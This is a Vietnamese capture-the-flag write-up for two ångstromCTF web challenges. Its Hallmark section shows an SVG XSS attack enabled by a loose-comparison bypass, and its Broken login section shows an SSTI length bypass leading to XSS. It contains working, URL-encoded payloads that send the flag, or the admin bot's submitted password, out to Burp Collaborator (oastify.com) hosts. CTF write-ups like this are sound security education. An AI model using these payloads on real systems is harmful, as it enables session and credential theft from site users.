# 1. Hallmark
![image](https://user-images.githubusercontent.com/103978452/235079807-32bf2932-9cb2-4b36-96f8-f8cc1a2af082.png)

Website cho phép user tạo thiệp mời với đoạn text bất kỳ hoặc một svg image. Tùy vào loại nội dung mà response sẽ có content-type phù hợp. Ngoài ra, có admin bot sẽ truy cập URL mà ta đưa vào.

Request tạo card:
```
POST /card HTTP/1.1
Host: hallmark.web.actf.co
Content-Length: 20
Content-Type: application/x-www-form-urlencoded

svg=text&content=abc
```
Khi đó website sẽ tạo một card với một uuid, và `GET /card?id=<card_uuid>` sẽ có response là nội dung của card. Nếu method tạo card có `svg=text` thì response trả về card có `Content-Type: text/plain`. Nếu `svg=heart` hoặc các giá trị nằm trong danh sách svg, card có `Content-Type: image/svg+xml`.

Đọc source code, ta thấy có đoạn sau:
```
app.put("/card", (req, res) => {
    let { id, type, svg, content } = req.body;

    if (!id || !cards[id]){
        res.send("bad id");
        return;
    }

    cards[id].type = type == "image/svg+xml" ? type : "text/plain";
    cards[id].content = type === "image/svg+xml" ? IMAGES[svg || "heart"] : content;

    res.send("ok");
});
```

Ta có thể chèn đoạn text bất kỳ nhưng Content-Type sẽ là plain/text => không thể tạo executable script. Còn nếu tạo card với Content-Type là image/svg+xml thì content bị giới hạn, chỉ được sử dụng các card hệ thống cho sẵn. Như vậy, ta cần tìm cách bypass để chèn text vào nhưng Content-Type vẫn là svg => XSS => Khiến admin bot khai ra flag.

Để exploit, ta sẽ lợi dụng lỗ hổng loose comparison trong controller `PUT /card`. Ta submit request:
```
PUT /card HTTP/1.1
Host: hallmark.web.actf.co
Content-Length: 82
Content-Type: application/x-www-form-urlencoded

id=d917d80d-4a5b-413b-9b9d-c6f7ce1a1c08&type[]=image/svg%2bxml&svg=abc&content=abc
```
Khi request trên được xử lý, server sẽ đọc `type[]` như một array, khiến operator `==` trả về true, còn `===` trả về false => phá vỡ logic code => exploited!

Khi đó, gửi request `GET /card?id=d917d80d-4a5b-413b-9b9d-c6f7ce1a1c08` ta được response:
```
HTTP/1.1 200 OK
Server: nginx/1.23.3
Date: Fri, 28 Apr 2023 07:31:02 GMT
Content-Type: image/svg+xml
Content-Length: 3
Connection: close
X-Powered-By: Express
ETag: W/"3-qZk+NkcGgWq6PiVxeFDCbJzQ2J0"

abc
```

Như vậy ta đã có thể tấn công XSS sử dụng các đoạn mã svg. Thay thế `abc` bằng đoạn svg có thể trigger một request đến `/flag`, đọc response sau đó gửi về BurpCollaborator, kết quả ta lấy được flag.

Gửi request thay đổi nội dung card:
```
PUT /card HTTP/1.1
Host: hallmark.web.actf.co
Content-Length: 901
Content-Type: application/x-www-form-urlencoded

id=d917d80d-4a5b-413b-9b9d-c6f7ce1a1c08&type[]=image/svg%2bxml&svg=abc&content=%3C%3Fxml+version%3D%221.0%22+standalone%3D%22no%22%3F%3E%0A%3C%21DOCTYPE+svg+PUBLIC+%22-%2F%2FW3C%2F%2FDTD+SVG+1.1%2F%2FEN%22+%22http%3A%2F%2Fwww.w3.org%2FGraphics%2FSVG%2F1.1%2FDTD%2Fsvg11.dtd%22%3E%0A%0A%3Csvg+version%3D%221.1%22+baseProfile%3D%22full%22+xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A+++%3Crect+width%3D%22300%22+height%3D%22100%22+style%3D%22fill%3Argb%280%2C0%2C255%29%3Bstroke-width%3A3%3Bstroke%3Argb%280%2C0%2C0%29%22+%2F%3E%0A+++%3Cscript+type%3D%22text%2Fjavascript%22%3E%0A++++++var+xhr+%3D+new+XMLHttpRequest%28%29%3B%0Axhr.open%28%22GET%22%2C+%22%2Fflag%22%29%3B%0Axhr.onreadystatechange+%3D+%28%29+%3D%3E+%7Bdocument.location%3D%22https%3A%2F%2Frzu81o07v0z9s6jkjbo5ccdyfplf94.oastify.com%3Fflag%3D%22%2Bxhr.responseText%3B%7D%0Axhr.send%28%29%3B%0A+++%3C%2Fscript%3E%0A%3C%2Fsvg%3E
```

Flag: `actf{the_adm1n_has_rece1ved_y0ur_card_cefd0aac23a38d33}`

# 2. Broken login
Challenge cung cấp source code của file `app.py` và source code của admin bot.

File `app.py`:
```
from flask import Flask, make_response, request, escape, render_template_string

app = Flask(__name__)

fails = 0

indexPage = """...Login form..."""

@app.get("/")
def index():
    global fails
    custom_message = ""

    if "message" in request.args:
        if len(request.args["message"]) >= 25:
            return render_template_string(indexPage, fails=fails)
        
        custom_message = escape(request.args["message"])
    
    return render_template_string(indexPage % custom_message, fails=fails)


@app.post("/")
def login():
    global fails
    fails += 1
    return make_response("wrong username or password", 401)


if __name__ == "__main__":
    app.run("0.0.0.0")
```

Khảo sát website, ta thấy các chức năng:

+) Login form cho phép nhập username và password, sẽ hiển thị "Wrong username or password" cho dù thông tin đăng nhập có là gì chăng nữa.

+) Admin bot sẽ visit URL với domain hợp lệ, điền thông tin username và password vào các ô input rồi submit form. Trong đó, password chính là flag.

Như vậy, ta cần đọc request login do admin bot submit. Đọc file `app.py`, ta thấy tham số `message` được truyền vào template. Thử `/?message={{7*7}}` => có lỗ hổng SSTI, tuy nhiên giới hạn độ dài là 25 nên cần tìm cách bypass.

Để bypass length, ta dùng `/?message={{request.args.a|safe}}&a=abc`. Khi `message` được load vào template, nó sẽ đọc tham số `a` trong query string và thay thế bằng giá trị của `a` khiến chuỗi`abc` được hiển thị. Ta thấy website chỉ escape biến `message` => XSS với parameter `a` => có thể tạo payload khiến Admin Bot execute script, gửi request đến BurpCollaborator.

Payload cuối cùng như sau: `https://brokenlogin.web.actf.co/?message={{request.args.a|safe}}&a=%3Cform+action%3D%22https%3A%2F%2Fuywcqez17hkq9srcsampsedao1urig.oastify.com%2Ftest%22+method%3D%22POST%22%3E%3Cinput+type%3D%22text%22+name%3D%22username%22%3E%3Cinput+type%3D%22text%22+name%3D%22password%22%3E%3Cinput+type%3D%22submit%22+value%3D%22SUBMIT%22%3E%3C%2Fform%3E`
